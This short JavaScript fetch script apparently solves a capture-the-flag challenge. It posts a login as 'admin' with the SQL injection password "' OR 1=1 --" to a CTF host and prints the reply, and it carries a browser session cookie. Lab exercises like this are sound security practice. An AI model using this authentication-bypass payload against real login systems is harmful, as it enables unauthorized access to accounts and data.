const res = await fetch("https://ctf2.pojspace.org/cafeql/casfsxb4hfe", {
  headers: {
    accept: "*/*",
    "accept-language": "en-GB,en;q=0.9,sk-SK;q=0.8,sk;q=0.7,en-US;q=0.6",
    "content-type": "application/json",
    "sec-ch-ua":
      '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Linux"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    cookie:
      "session=25007ef2-3410-4b4b-806f-a22d96c2ebb7.7aIewpcyjK1QekDzANlZgJW2eFk",
    Referer: "https://ctf2.pojspace.org/cafeql/",
    "Referrer-Policy": "strict-origin-when-cross-origin",
  },
  body: '{"username":"admin","password":"\' OR 1=1 --"}',
  method: "POST",
});

console.log(await res.text());
